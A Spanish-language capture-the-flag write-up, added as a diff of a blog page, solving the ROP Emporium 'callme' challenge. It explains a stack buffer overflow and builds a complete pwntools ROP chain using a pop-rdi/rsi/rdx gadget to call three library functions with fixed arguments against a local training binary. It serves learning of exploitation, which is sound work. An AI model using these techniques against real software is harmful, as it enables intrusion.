@@ -1,0 +1,183 @@
+I"�:<p class="lead">Para resolver este desafio usaremos ROP para llamar multiples funciones con multiples argumentos en el orden correcto</p>
+
+<h2 id="analisis">Analisis</h2>
+
+<p><img src="/assets/img/callme/1.png" alt="" /></p>
+
+<p>No tiene canary, PIE, pero tiene NX, asi que no podemos ejecutar codigo en el stack.</p>
+
+<p>Al ver la funcion main, lo unico interesante es el llamado a la funcion <code class="language-plaintext highlighter-rouge">pwnme</code></p>
+
+<p><img src="/assets/img/callme/2.png" alt="" /></p>
+
+<p>Una vez en esa funcion, podemos ver la vulnerabilidad:</p>
+
+<p><img src="/assets/img/callme/3.png" alt="" /></p>
+
+<p>Vemos que esta intentando escribir <code class="language-plaintext highlighter-rouge">0x200</code> bytes (512 en decimal) de la entrada estandar (stdin), dado un buffer, pero… Te voy a demostrar por que es vulnerable.</p>
+
+<p>Cuando se hace el llamado a <code class="language-plaintext highlighter-rouge">read()</code>, se hace con esta estructura:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">ssize_t</span> <span class="nf">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>El primer argumento <code class="language-plaintext highlighter-rouge">fd</code>, se le conoce como <code class="language-plaintext highlighter-rouge">file decriptor</code>, que en palabras simples, se usa para crear una entrada para un archivo, esa entrada se identifica con un numero unico</p>
+
+<p>El segundo argumento es un puntero a un buffer, y este buffer se esta creando aca:</p>
+
+<p><img src="/assets/img/callme/4.png" alt="" /></p>
+
+<p>Podemos ver que se esta inicializando un buffer de <code class="language-plaintext highlighter-rouge">0x20</code> bytes (32 en decimal) con el nombre de <code class="language-plaintext highlighter-rouge">buf</code></p>
+
+<p>El tercer argumento es la cantidad de bytes que va a escribir en ese buffer, que son <code class="language-plaintext highlighter-rouge">0x200</code>.</p>
+
+<p>Entonces representando la funcion con los valores, quedaria asi:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">ssize_t</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">512</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Esta tratando de escribir <code class="language-plaintext highlighter-rouge">512</code> bytes en <code class="language-plaintext highlighter-rouge">32</code>, y como no se esta limitando la cantidad de bytes ingresados, ese buffer de <code class="language-plaintext highlighter-rouge">32</code> bytes va a petar, es la clasica vulnerabilidad buffer overflow, por que se esta sobrepasando la cantidad del buffer, que son 32.</p>
+
+<p>Al mostrar todas las funciones en radare, tenemos que existe una funcion que se llama <code class="language-plaintext highlighter-rouge">usefulFunction</code>:</p>
+
+<p><img src="/assets/img/callme/5.png" alt="" /></p>
+
+<p>Al mostrar el codigo de la funcion:</p>
+
+<p><img src="/assets/img/callme/6.png" alt="" /></p>
+
+<p>Nos damos cuenta que esta llamando a las funciones <code class="language-plaintext highlighter-rouge">callme_three</code>, <code class="language-plaintext highlighter-rouge">callme_two</code> y <code class="language-plaintext highlighter-rouge">callme_one</code>, y se estan llamando con los argumentos <code class="language-plaintext highlighter-rouge">rdi</code>, <code class="language-plaintext highlighter-rouge">rsi</code> y <code class="language-plaintext highlighter-rouge">rdx</code>.</p>
+
+<p>Como curiosidad, si intentamos mostrar el codigo de una funcion de esas, no vamos a poder, sale algo como esto:</p>
+
+<p><img src="/assets/img/callme/7.png" alt="" /></p>
+
+<p>Y eso es por que las funciones <code class="language-plaintext highlighter-rouge">callme_three</code>, <code class="language-plaintext highlighter-rouge">callme_two</code> y <code class="language-plaintext highlighter-rouge">callme_one</code> se encuetran en PLT que se esta cargando dinamicamente de <code class="language-plaintext highlighter-rouge">libcallme.so</code>, entonces para poder verlas, tenemos que ejecutar el binario, me ire a gdb y pondre un breakpoint en el <code class="language-plaintext highlighter-rouge">ret</code> de la funcion main:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x0000000000400897 &lt;+80&gt;:	ret
+</code></pre></div></div>
+
+<p>Y ahora si ya podemos ver su codigo, y lo mas relevante es que cuando se hace un llamado a <code class="language-plaintext highlighter-rouge">callme_one</code>, los argumentos que se le pasan los compara con:</p>
+
+<ul>
+  <li>0xdeadbeefdeadbeef</li>
+  <li>0xcafebabecafebabe</li>
+  <li>0xd00df00dd00df00d</li>
+</ul>
+
+<p><img src="/assets/img/callme/8.png" alt="" /></p>
+
+<p>(en <code class="language-plaintext highlighter-rouge">callme_three</code> y <code class="language-plaintext highlighter-rouge">callme_two</code> es lo mismo)</p>
+
+<p>Asi que ahora sabemos que debemos de llamar a <code class="language-plaintext highlighter-rouge">callme_three</code>, <code class="language-plaintext highlighter-rouge">callme_two</code> y <code class="language-plaintext highlighter-rouge">callme_one</code> con los valores con los que se comparan los registros <code class="language-plaintext highlighter-rouge">rdi</code>, <code class="language-plaintext highlighter-rouge">rsi</code> y <code class="language-plaintext highlighter-rouge">rdx</code></p>
+
+<h2 id="crafteando-el-exploit">Crafteando el exploit</h2>
+
+<p>Para saber el desplazamiento para llegar al RIP, podemos generar una cadena con <code class="language-plaintext highlighter-rouge">pattern create 100</code> y pasaresela al programa, despues podemos hacer <code class="language-plaintext highlighter-rouge">pattern offset $rbp</code>:</p>
+
+<p><img src="/assets/img/callme/9.png" alt="" /></p>
+
+<p>Y al sumarle 8 bytes, y nos da 40</p>
+
+<p>Asi va esta ahora:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./callme"</span><span class="p">)</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">40</span>
+
+<span class="n">argumento_1</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
+<span class="n">argumento_2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabecafebabe</span><span class="p">)</span>
+<span class="n">argumento_3</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xd00df00dd00df00d</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>Como tenemos que escribir en rdi, rsi y rdx, debemos que buscar un gadget que nos permita hacer eso, usare ROPgadget con el comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ROPgadget --binary callme | grep 'pop rdi ; pop rsi ; pop rdx ; ret'
+</code></pre></div></div>
+
+<p>Y este nos funciona: <code class="language-plaintext highlighter-rouge">0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret</code></p>
+
+<p>Asi va el exploit:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./callme"</span><span class="p">)</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">40</span>
+
+<span class="n">argumento_1</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
+<span class="n">argumento_2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabecafebabe</span><span class="p">)</span>
+<span class="n">argumento_3</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xd00df00dd00df00d</span><span class="p">)</span>
+
+<span class="n">gadget</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040093c</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Despues ocupamos las direcciones de callme_one y las demas, eso lo podemos hacer con el comando <code class="language-plaintext highlighter-rouge">afl</code> en radare:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./callme"</span><span class="p">)</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">40</span>
+
+<span class="n">argumento_1</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
+<span class="n">argumento_2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabecafebabe</span><span class="p">)</span>
+<span class="n">argumento_3</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xd00df00dd00df00d</span><span class="p">)</span>
+
+<span class="n">gadget</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040093c</span><span class="p">)</span>
+
+<span class="n">callme_one</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00400720</span><span class="p">)</span>
+<span class="n">callme_two</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00400740</span><span class="p">)</span>
+<span class="n">callme_three</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x004006f0</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Y por ultimo tenemos que mandar el payload en el orden correcto, primero el padding, luego el gadget, los valores de los argumentos y la funcion, asi queda el exploit completo</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./callme"</span><span class="p">)</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">40</span>
+
+<span class="n">argumento_1</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
+<span class="n">argumento_2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabecafebabe</span><span class="p">)</span>
+<span class="n">argumento_3</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xd00df00dd00df00d</span><span class="p">)</span>
+
+<span class="n">gadget</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040093c</span><span class="p">)</span>
+
+<span class="n">callme_one</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00400720</span><span class="p">)</span>
+<span class="n">callme_two</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00400740</span><span class="p">)</span>
+<span class="n">callme_three</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x004006f0</span><span class="p">)</span>
+
+<span class="n">args</span> <span class="o">=</span> <span class="n">argumento_1</span> <span class="o">+</span> <span class="n">argumento_2</span> <span class="o">+</span> <span class="n">argumento_3</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">gadget</span> <span class="o">+</span> <span class="n">args</span> <span class="o">+</span> <span class="n">callme_one</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">gadget</span> <span class="o">+</span> <span class="n">args</span> <span class="o">+</span> <span class="n">callme_two</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">gadget</span> <span class="o">+</span> <span class="n">args</span> <span class="o">+</span> <span class="n">callme_three</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p>Y ya tenemos la flag</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>󰣇  c4rta /tmp/callme  python3 exploit.py
+[+] Starting local process './callme': pid 15024
+[+] Receiving all data: Done (172B)
+[*] Process './callme' stopped with exit code 0 (pid 15024)
+callme by ROP Emporium
+x86_64
+
+Hope you read the instructions...
+
+&gt; Thank you!
+callme_one() called correctly
+callme_two() called correctly
+ROPE{a_placeholder_32byte_flag!}
+</code></pre></div></div>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
